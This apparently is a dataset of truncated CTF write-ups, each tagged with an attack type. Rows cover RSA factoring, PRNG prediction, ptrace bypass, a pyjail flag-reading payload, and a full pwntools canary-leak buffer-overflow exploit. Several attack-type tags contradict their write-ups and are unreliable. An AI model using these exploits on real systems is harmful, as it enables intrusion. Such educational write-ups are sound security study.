ctf_writeup,writeups-12,writeups,hack.lu-ctf-2015/coding/GuessTheNumber/sudhackar/README.md,sudhackar,format_string,"[](ctf=hack.lu-2015) [](type=coding) [](tags=random) # GuessTheNumber (coding-150) ``` The teacher of your programming class gave you a tiny little task: just write a guess-my-number script that beats his script. He also gave you some hard facts: he uses some LCG with standard glibc LCG parameters the LCG is seeded with server time using number format YmdHMS (python strftime syntax) numbers are from 0 up to (including) 99 numbers should be sent as ascii string You can find the service on school.fluxfingers.net:1523 ``` ```bash $ nc school.fluxfingers.net 1523 Welcome to the awesome guess-my-number game! It's 22.10.2015 today and we have 13:01:49 on the server right now. Today's goal is easy: just guess my 100 numbers on the first try within at least 30 seconds from now on. Ain't difficult, right? Now, try the first one: 99 Wrong! You lost the game. The right answer would have been '61'. Quitting. ``` So here we have a random number generator and we have to guess 100 numbers on the server. Searching about LCG we land on [this](http://rosettacode.org/wiki/Linear_congruential_generator#C) page. The seed is given by the server in the message.It is the standard rand_r function in glibc "
ctf_writeup,writeups-13,writeups,hack.lu-ctf-2015/exploiting/Stackstuff/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=hack.lu-2015) [](type=exploiting,pwn) [](tags=buffer-overflow) [](tools=gdb-peda,pwntools) [](techniques=ROP) # Stackstuff (Exploiting 150) We have an [archive](../stackstuff_public_d7f6e7f394f649ba96b3113374a0bfb3.tar.gz). On extracting ```bash $ file * hackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped hackme.c: C source, ASCII text ``` We have source of the executable. ```c int check_password_correct(void) { char buf[50] = {0}; puts(""To download the flag, you need to specify a password.""); printf(""Length of password: ""); int inlen = 0; if (scanf(""%d\n"", &inlen) != 1) { // peer probably disconnected? exit(0); } if (inlen <= 0 || inlen > 50) { // bad input length, fix it inlen = 90; } if (fread(buf, 1, inlen, stdin) != inlen) { // peer disconnected, stop exit(0); } return strcmp(buf, real_password) == 0; } void require_auth(void) { while (!check_password_correct()) { puts(""bad password, try again""); } } void handle_request(void) { alarm(60); setbuf(stdout, NULL); FILE *realpw_file = fopen(""password"", ""r""); if (r"
ctf_writeup,writeups-14,writeups,hack.lu-ctf-2015/crypto/Creative Cheating/sudhackar/README.md,sudhackar,other,"[](ctf=hack.lu-2015) [](type=crypto) [](tags=rsa) # Creative Cheating (crypto-150) We have a [pcapng](../dump_2bd6da8de87c6f1170dec710f7268a16.pcapng). Opening it with wireshark we see data packets. Follow the stream and extract it to a [file](str). We see the data is base64'd. ```bash cat str | base64 -d > full ``` each line has data in this format. ``` SEQ = 00; DATA = 0x19688f112a61169c9090a4f9918dL; SIG = 0x1448ac6eee2b2e91a0a6241e590eL; ``` What we can conclude is that DATA is the actual ciphertext which was sent to Bob (192.168.0.37). DATA was encrypted using public key of Bob. So we hit factor-db and generate private key for BOB to decrypt data. ```python >>> p=49662237675630289 >>> q=62515288803124247 >>> s=(p-1)*(q-1) >>> n=3104649130901425335933838103517383 >>> p*q==n True >>> e=0x10001 >>> d=modinv(e,s) >>> d 1427000713644866747260499795119265L >>> arr=[0x19688f112a61169c9090a4f9918d,0x50d31689fa2c33f1d5ca0dad9eda,0x50d31689fa2c33f1d5ca0dad9eda,0x59e9bb001b0d9167dbc39dd544c9,0x633282273f9cf7e5a44fcbe1787b,0x7492f4ec9001202dcb569df468b4,0x13a5bbd5163bdf483542906c5bf,0x23d28a636bf59c450ca3a2b0ac13,0x292ffa2958c1318f687dd9ec5d12,0x41c66817dcc70c5cfefa5ac8af9d,0xa02a43cdf9aa"
ctf_writeup,writeups-15,writeups,mma-ctf-2016/pwn/greeting/sudhackar/README.md,sudhackar,format_string,[](ctf=mma-ctf-2016) [](type=exploit) [](tags=format string) [](tools=libformatstr) [](techniques=format string) # greeting (pwn-150) [Binary](../greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c) [Solution](greeting.py) [![asciicast](https://asciinema.org/a/0e7jitfip9k5n7ir4bbw0xp0d.png)](https://asciinema.org/a/0e7jitfip9k5n7ir4bbw0xp0d)
ctf_writeup,writeups-16,writeups,mma-ctf-2016/crypto/twin-primes/sudhackar/README.md,sudhackar,other,"[](ctf=mma-ctf-2016) [](type=crypto) [](tags=RSA) [](tools=gmpy) [](techniques=factorisation,shreedharacharya) # twin-primes (crypto-50) [Zip](../twin-primes.7z-39a1a147cbf55d4d944f8eacdbdf4ee7a967dd70ef0eaaa0a1cee5c58c641483) [Solution](twin-primes.py)"
ctf_writeup,writeups-17,writeups,mma-ctf-2016/crypto/super-express/sudhackar/README.md,sudhackar,other,[](ctf=mma-ctf-2016) [](type=crypto) [](tags=substitution) [](tools=) [](techniques=brute force) # super-express (crypto-100) [Binary](../super_express.7z-eae5a801032c7b6866aa790ad11c7a30c133b160df4997e2323fead2ec7fe15a) [Solution](decrypt.py)
ctf_writeup,writeups-18,writeups,tum-ctf-2016/pwn/lolcpp/sudhackar/README.md,sudhackar,other,[](ctf=tum-ctf-2016) [](type=exploit) [](tags=bof) [](tools=pwntools) [](techniques=) # lolcpp (pwn-250) [Binary](../lolcpp.tar.gz) [Solution](lolcpp.py) [![asciicast](https://asciinema.org/a/87835.png)](https://asciinema.org/a/87835)
ctf_writeup,writeups-19,writeups,inferno-ctf-2019/pwn/treat/vn-ki/README.md,vn-ki,command_injection,"# Treat Me #### Category: pwn #### Points: 200 Let's, check the binary. ``` $ checksec ./treat [*] '/home/vn-ki/ctf/inferno/treat/treat' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ``` Reversing the binary, we see there are 3 inputs. 1. Our name, stored in `.bss`, i.e. we know the address of this without leaking. 2. Choice, this is a buffer on the stack. 3. Feedback, this is the same buffer as 2. All the inputs are taken using a custom function which will terminate the input at null and newline. I initally thought of a ret2plt, but the null characters will be a problem. Inspecting more we discover another function. ```c void FUN_00401186(void) { char *__command; puts(""You want some special treat?\nHere you go""); __command = getenv(""TREAT""); system(__command); return; } ``` Well, well, well, what do we have here. This function calls system on the environment variable TREAT. The attack vector is quite clear now. Overwrite the environment variables on the stack to point to TREAT=/bin/sh. For that we have to find how far away the first environment variable is. ``` pwndbg> x/gx (char **)environ 0x7fffffffdea8: 0x00007fffffffe21"
ctf_writeup,writeups-20,writeups,inferno-ctf-2019/rev/webcrackme/vn-ki/README.md,vn-ki,command_injection,"# Web Crackme #### Category: rev #### Pts: 399 http://104.197.168.32:17030/#challenge Looking at sources, we see some code is constructed and evaled and there are 2 wasm functions. ```js async execute() { var key = document.getElementById('key').value; var stringFromKey = """"; for (var i = 0; i < key.length; i++) { stringFromKey+=key.charCodeAt(i).toString(16); } const parsedWat = wabtCompiler.parseWat("""", this.wat); const buffer = parsedWat.toBinary({}).buffer; const wasmModule = await WebAssembly.compile(buffer); eval(this.js); return 0; } ``` Put a breakpoint in one of the function and enter some input. Go up the call stack. We will see the generated evaled script. ```js const wasmInstance = new WebAssembly.Instance(wasmModule, {}); const { myFunction1,myFunction2 } = wasmInstance.exports; let res1 = myFunction1().toString(16); let res2 = myFunction2().toString(16); let finalres = res1 + res2; if (finalres == stringFromKey){ alert(""Here you go infernoCTF{""+key+""}""); } else{ alert(""Naah, Remember I'm the future!!""); } ``` In the console, check the variable `finalres` ``` >finalres ""665579592d4d6539"" ``` Converting to ascii, we get the flag."
ctf_writeup,writeups-21,writeups,inferno-ctf-2019/rev/darkcrackme/vn-ki/README.md,vn-ki,format_string,"# darcrackme #### Category: rev #### Points: 200 The binary asks for username and password when we run it. ``` ./darkcrackme ||============================================|| || DARK ARMY SAFE v2.0 || ||~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|| || || | | | / / (\-""```""-/) \ \ | | / / //^\ /^\\ \ \ | | / / ;/ ~_\ /_~ \; \ \ | | / / | / \Y/ \ | \ \ | | | | (, \0/ \0/ ,) | | | | \ \ | / \ | / / | | \ \ | (_\._./_) | / / | | \ \ )|\ \v-.-v/ /|( / / | | \ \ / ) \ `===' / ( \ / / | | """""" """""" | ||~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|| || Only the top 1% of the 1% can crack me! || ||============================================|| Username :: asd Password :: as ``` Opening the binary in ghidra, we see, ```c iVar1 = strcmp(username,""1_4m_th3_wh1t3r0s3""); if (iVar1 == 0) { iVar1 = FUN_004013f9(username,password); if (iVar1 == 1) { puts(""\nAuthorised!!""); printf(""Here is my Dark Secret : infernoCTF{%s}\n"",local_e8); } else { puts(""\nAre you trying to pwn the pwners""); } } ``` Our username and password is the parameters to a function. When we look inside the function, we see that another string is constructed using our password and is check against the username. The function roughly "
ctf_writeup,writeups-22,writeups,trend-micro-ctf-2015/prog/click-on-the-different-color/chaitan94/README.md,chaitan94,other,"[](ctf=trend-micro-ctf-2015) [](type=prog) [](tags=) [](tools=PIL) [](techniques=) # Click on the different color (prog-100) Problem statement is straightforward. We are given a square grid: ![Squares](../squares.png) We have to click on the tile which has the odd color. After each such click, the grid gets larger and larger. Obviously, we need to automate this, so wrote down a [quick script](bot.py), and let it play for a few minutes. After our bot plays for about 80 levels, we get the flag: > TMCTF{U must have R0807 3Y3s!}"
ctf_writeup,writeups-23,writeups,trend-micro-ctf-2015/prog/calculator/chaitan94/README.md,chaitan94,format_string,"[](ctf=trend-micro-ctf-2015) [](type=prog) [](tags=roman,parsing) [](tools=) [](techniques=) # Calculator (prog-200) Again, problem is simple: We're given simple arithmetic questions, we need to calculate their values. In the start, it's quite simple as the questions contained just numbers and operators. Python's `eval()` would've been more than enough, but as level increase, we get numbers separated by commas (like 62,234,612). Even more, we start to see roman numerals (CMXIV), and finally even numbers in plain english! (six hundred twenty two). To automate this, we wrote a python script which after reading each question, does the following: ```python def solve(ques): # We only need lhs ques = ques.split(""="")[0] # We don't need commas ques = ques.repace(',', '') parsed = '' # Let's separate parts between operators groups = re.split('([\-\+\*\/\(\)])', ques) # Convert each part to a number for g in groups: g = g.strip() # If part a roman numeral, convert it to decimal if re.match('([A-Z]+)', g): parsed += ""%s"" % roman.fromRoman(g) # If part is in plain english, convert it to decimal elif re.match('([a-z]+)', g): parsed += ""%s"" % text2int(g) else: parsed += g # Now eval can do the r"
ctf_writeup,writeups-24,writeups,trend-micro-ctf-2015/analysis/defensive-100/sudhackar/README.md,sudhackar,command_injection,"[](ctf=trend-micro-ctf-2015) [](type=analysis,reverse) [](tags=payload,drop) [](tools=gdb-peda) [](techniques=breakpoints) I think this is the unintended solution. We are given a [zip](../vonn.zip) password:wx5tOCvU3g2FmueLEvj5np9xJX0cND3K. This gives us a binary. ```sh $ file vonn vonn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7f89c2bb36cc9d0882a4980a99d44a7674fb09e2, not stripped $ ./vonn You are not on VMM ``` Thats it! we don't know whats happening. So i quickly load it with gdb-peda and after setting some breakpoints,we're ready to step through the execution. ```sh gdb-peda$ b *0x400b8d Breakpoint 1 at 0x400b8d ``` After some stepping when we get to puts call for output ```objdump 0x400cd3 <main+326>: cmp rax,QWORD PTR [rbp-0x8] 0x400cd7 <main+330>: je 0x400cfc <main+367> 0x400cd9 <main+332>: mov edi,0x401100 => 0x400cde <main+337>: call 0x400990 <puts@plt> 0x400ce3 <main+342>: mov rax,QWORD PTR [rbp-0xd0] 0x400cea <main+349>: mov rax,QWORD PTR [rax] 0x400ced <main+352>: mov rdi,rax 0x400cf0 <main+355>: mov eax,0x0 Guessed arguments: arg[0]: 0x401100 (""You are on VMM!"")"
ctf_writeup,writeups-25,writeups,trend-micro-ctf-2015/crypto/crypto-100/chaitan94/README.md,chaitan94,other,"[](ctf=trend-micro-ctf-2015) [](type=crypto) [](tags=rsa) [](tools=factordb,rsatool,openssl) [](techniques=rsa) # crypto-100 Problem description > You're given an RSA public key and an encrypted message which contains a flag. Get the flag. > > There's also a hint about ""1bit"" being wrong in the public key. > > message: kPmDFLk5b/torG53sThWwEeNm0AIpEQek0rVG3vCttc= So lets go ahead and get the modulus (n) and exponent (e) from the given [public key](../PublicKey.pem) ```bash $ openssl rsa -pubin -inform PEM -text -noout < PublicKey.pem Public-Key: (256 bit) Modulus: 00:b6:2d:ce:9f:25:81:63:57:23:db:6b:18:8f:12: f0:46:9c:be:e0:cb:c5:da:cb:36:c3:6e:0c:96:b6: ea:7b:fc Exponent: 65537 (0x10001) ``` n's value in base 10 is 82401872610398250859431855480217685317486932934710222647212042489320711027708 Hmm, n is even? Question says 1 bit is wrong.. it has to be last bit! So, n must be 82401872610398250859431855480217685317486932934710222647212042489320711027709 Lets try http://www.factordb.com/index.php?query=82401872610398250859431855480217685317486932934710222647212042489320711027709 Perfect! Got p and q. Let's generate private key and decrypt ```bash $ python2 rsatool.py -f PEM -o private"
ctf_writeup,writeups-26,writeups,csaw-quals-2023/pwn/super_secure_heap/sudhackar/README.md,sudhackar,heap,[](ctf=csaw-quals-2023) [](type=pwn) [](tags=heap) [](tools=pwntools) # [Super Secure Heap](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/pwn/super_secure_heap) It crashes on last stage on remote for some reason Debugged it in docker. Looks like a stack alignment issue. ```sh $ cat flag.txt [DEBUG] Sent 0xd bytes: b'cat flag.txt\n' [DEBUG] Received 0x2d bytes: b'csawctf{_d0es_Borat_aPpr0ve_oF_tH3_n3w_SsH?}\n' csawctf{_d0es_Borat_aPpr0ve_oF_tH3_n3w_SsH?} ``` Actually solved this chall without a debugger 🙂 ## Script [`solve.py`](./solve.py)
ctf_writeup,writeups-27,writeups,csaw-quals-2023/pwn/unlimited_subway/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-quals-2023) [](type=pwn,rev) [](tags=buffer-overflow,canary) [](tools=pwntools,ida) ```py from pwn import * context.log_level = ""debug"" context.binary = ""./unlimited_subway"" def get(p, idx): p.recvuntil('> ') p.sendline('V') p.recvuntil(': ') p.sendline(str(idx)) p.recvuntil(': ') b = int(p.recvline(), 16) return b def exploit(): p = remote('pwn.csaw.io', 7900) # nc pwn.csaw.io 7900 x = get(p, 128) assert(x==0) canary = 0 canary |= (get(p, 129) << 8) canary |= (get(p, 130) << 16) canary |= (get(p, 131) << 24) payload = b'A'*0x40+p32(canary)+p32(0xdeadbeef)+p32(context.binary.symbols[""print_flag""]) p.recvuntil('> ') p.sendline('E') p.recvuntil(': ') p.sendline(str(len(payload))) p.recvuntil(': ') p.sendline(payload) print(p.recvall()) p.close() if __name__ == ""__main__"": exploit() ''' [+] Receiving all data: Done (58B) [DEBUG] Received 0x3a bytes: 'csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}\n' [*] Closed connection to pwn.csaw.io port 7900 csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3} ''' ```"
ctf_writeup,writeups-28,writeups,csaw-quals-2023/pwn/unlimited_subway/gjain-7/README.md,gjain-7,other,"[](ctf=csaw-quals-2023) [](type=pwn,rev) [](tags=buffer-overflow,canary) [](tools=pwntools,ida) # [Unlimited Subway](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/pwn/unlimited_subway) Given a binary. ```sh csaw23/Subway » checksec --file=/usr/bin/cat 2 ↵ Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ``` Doing a quick checksec, notice that it has canary. Having a look on the [decompiled binary](./dec.c) we need to call `print_flag()`. We have control over input buffer, so we need to overflow the frame pointer, with the `print_flag` address. But doing so would also corrupt the canary, so first we need to leak the canary exploting ubnounded reads through `view_account`. ## Script [`sol.py`](./sol.py) flag: `csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}`"
ctf_writeup,writeups-29,writeups,csaw-quals-2023/rev/rox/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-quals-2023) [](type=rev) [](tags=) [](tools=) This is the source for rox that I rewrote. [`food.py`](./food.py) If one can invert the logic in test such that test returns 74 - that would be the solution to it. I did try a sidechannel but was not able to get the flag fully The flag looks something like `aN0ther_HeRRing_or_.....` ```sh osboxes@osboxes:~ $ python3 /tmp/else.py aN0ther_HeRRing_or_i (20, 'i') aN0ther_HeRRing_or_ir (21, 'r') aN0ther_HeRRing_or_irh (22, 'h') aN0ther_HeRRing_or_irht (23, 't') aN0ther_HeRRing_or_irhtH (24, 'H') aN0ther_HeRRing_or_irhtH3 (25, '3') aN0ther_HeRRing_or_irhtH3e (26, 'e') aN0ther_HeRRing_or_irhtH3ew (27, 'w') aN0ther_HeRRing_or_irhtH3ewi (28, 'i') aN0ther_HeRRing_or_irhtH3ewiT (49, 'T') aN0ther_HeRRing_or_irhtH3ewiTn (30, 'n') aN0ther_HeRRing_or_irhtH3ewiTn0 (30, '0') aN0ther_HeRRing_or_irhtH3ewiTn00 (30, '0') ``` I wasted doing a sidechannel on the binary without any promising results These are the sidechannel I tried with gdb but without any luck.\ [`some.py`](./some.py), [`else.py`](./else.py) flag: `aN0ther_HeRRing_or_iS_tHis_iT`"
ctf_writeup,writeups-30,writeups,csaw-quals-2023/rev/Impossibrawler/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-quals-2023) [](type=pwn,rev) [](tags=buffer-overflow,canary) [](tools=pwntools,ida) # [Impossibrawler](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/rev/Impossibrawler!) decompilation for `impossibrawler` ```js extends Node2D var totalenemies = 0 var rng = RandomNumberGenerator.new() var enemies_left = 0 func _process(delta): var mousepos = get_global_mouse_position() get_node(""Crosshair"").position = mousepos if enemies_left == 0: rng.seed = int(Vals.sd) var fbytes = rng.randf() Vals.sd = fbytes fbytes = str(fbytes) var flg = fbytes.to_ascii().hex_encode() $CanvasLayer / Label.set_text(""csawctf{"" + flg + ""}"") func _on_Enemy_killed(): enemies_left -= 1 func _on_Enemy_alive(): totalenemies += 1 enemies_left += 1 func _ready(): Input.set_mouse_mode(Input.MOUSE_MODE_HIDDEN) ``` It is static analysis only. Tried this ```js extends Node2D var totalenemies = 0 var rng = RandomNumberGenerator.new() var enemies_left = 0 func _process(delta): var mousepos = get_global_mouse_position() get_node(""Crosshair"").position = mousepos if enemies_left == 0: rng.seed = Vals.hits ^ enemies_left ^ Vals.playerdmg var fbytes = rng.randf() Vals.sd = fbytes get_tree().change_scene(""r"
ctf_writeup,writeups-31,writeups,csaw-quals-2023/crypto/Mental Poker/gjain-7/README.md,gjain-7,other,"[](ctf=csaw-quals-2023) [](type=crypto) [](tags=bruteforce,rsa,PRNG) [](tools=pwntools) # [Mental Poker](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/crypto/mental-poker) Given a `server.py` which is simulating a poker game. In order to win the flag one needs to continously win with a streak of 10. We have the control to shuffle the cards(encrypted) and player keys (`player_e` and `player_d`). The latter do not matter if we simply set them to `1`. Moving on, If we notice the `PRNG` implementation, in the state generation, only last 10 bits of `state.seed` are being used. ```py class PRNG: def __init__(self, seed = int(os.urandom(8).hex(),16)): self.seed = seed self.state = [self.seed] self.index = 64 for i in range(63): self.state.append((3 * (self.state[i] ^ (self.state[i-1] >> 4)) + i+1)%64) ``` We can then bruteforce the seed and find out the correct seed. To check the if a seed correct we decrpyt the cards using the private key derived from the seeds and check if the card name is sensible. Once we find the `computer_e`, we arrange the cards in the winning order and send the encrypted versions back. ## Script [`sol.py`](./sol.py) flag: `csawctf{m3n74l_p0k3r_15_4n_1"
ctf_writeup,writeups-32,writeups,csaw-quals-2023/misc/stonk/gjain-7/README.md,gjain-7,other,"[](ctf=csaw-quals-2023) [](type=misc) [](tags=python,implementation-gap) [](tools=) # [Stonks](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/misc/TradingGame) Given an implementation of a trading platform, one has 2000 balance and needs 9000 to buy the flag. One can do following operations: - buy a stock - sell a stock - trade a stock, with any lower valued stock. ### Finding gap ```py def threadTransact(): global QUEUE global TRADEPOST bkup = dict() while True: if QUEUE: key, action, s1, s2 = QUEUE.popleft() p = DB.getInstance().getUser(key) #process trading by posting trade request #onto the classified if action == 3: if(postTrade(key, s1)): TRADEPOST.append((key, s1, s2)) #money related actions is very costly to the server, #throttle if the user has more than 1 requests per second #over 10 second survey period if p.requests > 10: #Throttling, ignore request and attempts to restore if key in bkup: p = DB.getInstance().getUser(key) p.balance = bkup[key].balance p.requests = bkup[key].requests p.portfolio = bkup[key].portfolio continue bkup[key] = Portfolio.bkup(key, p.portfolio, p.balance, p.requests) if action == 1: buyDB(key, s1) elif action == 2: sellDB(key, s1) ``"
ctf_writeup,writeups-33,writeups,csaw-quals-2023/misc/AdminDiscordBot/AniRude/README.md,AniRude,other,"[](ctf=csaw-quals-2023) [](type=misc) [](tags=pyjail) [](tools=) # [Admin Discord Bot](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/misc/AdminDiscordBot) 1. To get flag we need have to `admin` role, so make your own server where you have that role and invite the bot. 2. Second part is a pyjail. We did it with following payload ``` !add list(open(\""flag.txt\"")) ``` ``` Dentaku BOT: ['csawctf{Y0u_4r3_th3_fl4g_t0_my_pyj4il_ch4ll3ng3}\n'] ```"
ctf_writeup,writeups-34,writeups,csaw-quals-2023/misc/android-dropper/sudhackar/README.md,sudhackar,rop,"[](ctf=csaw-quals-2023) [](type=misc) [](tags=android,java) [](tools=) ```java /* package whatever; // don't place package name! */ import java.util.*; import java.lang.*; import java.io.*; /* Name of the class has to be ""Main"" only if the class is public. */ class Ideone { static byte[] notTheFlag; public static void main (String[] args) throws java.lang.Exception { String str = ""bEVYCkNEWV5LRElPBgpFRApeQk8KWkZLRE9eCm9LWF5CBgpHS0QKQktOCktGXUtTWQpLWVlfR09OCl5CS14KQk8KXUtZCkdFWE8KQ0ReT0ZGQ01PRF4KXkJLRApORUZaQkNEWQpIT0lLX1lPCkJPCkJLTgpLSUJDT1xPTgpZRQpHX0lCCgcKXkJPCl1CT09GBgpkT10Kc0VYQQYKXUtYWQpLRE4KWUUKRUQKBwpdQkNGWV4KS0ZGCl5CTwpORUZaQkNEWQpCS04KT1xPWApORURPCl1LWQpHX0lBCktIRV9eCkNECl5CTwpdS15PWApCS1xDRE0KSwpNRUVOCl5DR08ECmhfXgpJRURcT1hZT0ZTBgpJWUtdSV5MUU5TRB5HG0l1RkUeTk94WXVYdUxfZAtXIF5CTwpORUZaQkNEWQpCS04KS0ZdS1NZCkhPRkNPXE9OCl5CS14KXkJPUwpdT1hPCkxLWApHRVhPCkNEXk9GRkNNT0ReCl5CS0QKR0tECgcKTEVYClpYT0lDWU9GUwpeQk8KWUtHTwpYT0tZRURZBA==""; notTheFlag = Base64.getDecoder().decode(str); System.out.println(obf(275, 306, 42)); // your code goes here } public static String obf(int i, int i2, int i3) { int i4 = i2 - i; char[] cArr = new char[i4]; for (int i5 = 0; i5 < i4; i5++) { cArr[i5] = (ch"
ctf_writeup,writeups-35,writeups,defcamp-quals-2015/reverse/r100/sudhackar/README.md,sudhackar,command_injection,"[](ctf=defcamp-quals-2015) [](type=reverse) [](tags=shift-cipher) We are given a [binary](../r100.bin). ```bash $ file r100.bin r100.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=0f464824cc8ee321ef9a80a799c70b1b6aec8168, stripped ``` On running it asks for a password and checks it. ```bash $ ./r100.bin Enter the password: AAAAAA Incorrect password! ``` A quick strace shows its protected from debugging using [ptrace](https://en.wikipedia.org/wiki/Ptrace). ```bash $ strace ./r100.bin . . ptrace(PTRACE_TRACEME, 0, 0, 0) = -1 EPERM (Operation not permitted) ``` So gdb won't work normally. The technique I used involved changing the return value in runtime during gdb debugging. ```bash $ objdump -d sep_15/d-ctf/r100.bin | grep \<ptrace@plt\> 0000000000400600 <ptrace@plt>: 4007da: e8 21 fe ff ff callq 400600 <ptrace@plt> ``` ```bash gdb-peda$ b *0x4007df Breakpoint 1 at 0x4007df gdb-peda$ r . . gdb-peda$ set $rax=0 ``` This will do the job. Now back to reversing. A brief decompilation gives us ```c int check(char *input) { int i; char p1[8] = ""Dufhbmf""; // [bp-20h] char p2[8] = ""pG"
ctf_writeup,writeups-36,writeups,defcamp-quals-2015/reverse/r200/sudhackar/README.md,sudhackar,command_injection,"[](ctf=defcamp-quals-2015) [](type=reverse) [](tags=hardcoded) We are given a [binary](../r200.bin). ```bash $ file r200.bin r200.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=22e68980e521b43c90688ed0693df78150b10211, stripped ``` This one has the same ptrace protection as in [r100](../../r100).We use the same technique to bypass ptrace check. ```bash gdb-peda$ b *0x40087d Breakpoint 1 at 0x40087d gdb-peda$ r . . gdb-peda$ set $rax=0 ``` Now the decompiling doesn't help much. We move to manually testing the flow path of binary. ```asm mov DWORD PTR [rbp-0x20],0x5 mov DWORD PTR [rbp-0x1c],0x2 mov DWORD PTR [rbp-0x18],0x7 mov DWORD PTR [rbp-0x14],0x2 mov DWORD PTR [rbp-0x10],0x5 mov DWORD PTR [rbp-0xc],0x6 ``` This seems interesting. A little bit of analysis shows ```bash 0x4007af: mov rax,QWORD PTR [rip+0x2008ca] # 0x601080 ``` On examining memory at 0x601080 and nearby areas we see the obvious. ```bash gdb-peda$ x/2xw 0x602010 0x602010: 0x00000001 0x0000006e gdb-peda$ x/2xw 0x602030 0x602030: 0x00000002 0x0000006f gdb-peda$ x/2xw 0x602050 0x602050: 0x00000003 0x00000070 gdb-"
ctf_writeup,writeups-37,writeups,defcamp-quals-2015/exploit/e100/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=defcamp-quals-2015) [](type=exploit) [](tags=buffer-overflow) We are given a [binary](../e100.bin) and a [key](../id_rsa_e100). ```bash $ file e100.bin e100.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4410355efef2e99ac54e4028dba1b3e40d055fee, stripped ``` Also loading in gdb-peda. ```bash gdb-peda$ checksec CANARY : ENABLED FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial ``` Good. Loading the binary in [Hopper](http://www.hopperapp.com/) and decompiling. ```c function sub_80484fd { var_C = *0x14; printf(""Enter password: ""); gets(var_2C); if (arg0 == 0xbadb0169) { system(""cat flag""); } else { for (var_30 = 0x0; var_30 < strlen(var_2C); var_30 = var_30 + 0x1) { *(int8_t *)(var_30 + var_2C) = arg0 ^ *(int8_t *)(var_30 + var_2C) & 0xff; } printf(""Your new secure password is: ""); printf(var_2C); } eax = var_C ^ *0x14; COND = eax == 0x0; if (!COND) { eax = __stack_chk_fail(); } return eax; } ``` So a gets and a static hardcoded check. Basic buffer overflow!! ```bash 0x804851b: lea eax,[ebp-0x2c] 0x804851e: mov DWORD PTR [esp],eax => 0x8048521: call 0x80483a0 <g"
ctf_writeup,writeups-38,writeups,csaw-quals-2015/recon/alexander-taylor/chaitan94/README.md,chaitan94,other,"[](ctf=csaw-quals-2015) [](type=recon) [](tags=googling) [](tools=) [](techniques=) # Alexander Taylor (recon-100) This question has a series of small tasks. ### Task 1 To start off, we're given the link http://fuzyll.com/csaw2015/start > Part 1 of ?: Oh, good, you can use HTTP! The next part is at /csaw2015/<the acronym for my universitys hacking club>. By googling ""Alexander Taylor"", we find his LinkedIn page: https://www.linkedin.com/in/fuzyll We see ""President of the Whitehatters Computer Security Club"" That takes to the next task: http://fuzyll.com/csaw2015/wcsc ### Task 2 > CSAW 2015 FUZYLL RECON PART 2 OF ?: TmljZSB3b3JrISBUaGUgbmV4dCBwYXJ0IGlzIGF0IC9jc2F3MjAxNS88bXkgc3VwZXIgc21hc2ggYnJvdGhlcnMgbWFpbj4uCg== ```bash $ echo ""TmljZSB3b3JrISBUaGUgbmV4dCBwYXJ0IGlzIGF0IC9jc2F3MjAxNS88bXkgc3VwZXIgc21hc2ggYnJvdGhlcnMgbWFpbj4uCg=="" | base64 -d Nice work! The next part is at /csaw2015/<my super smash brothers main>. ``` So googled ""Alexander Taylor Super Smash Brothers"", nothing useful in the first page.. Googled for ""fuzyll Super Smash Brothers"", found a YouTube video titled ""Smash 4 Monthly (July 2015) - Fuzyll (Yoshi) vs. AgentZ ..."" That takes us to next part: http://fuzyll.com/cs"
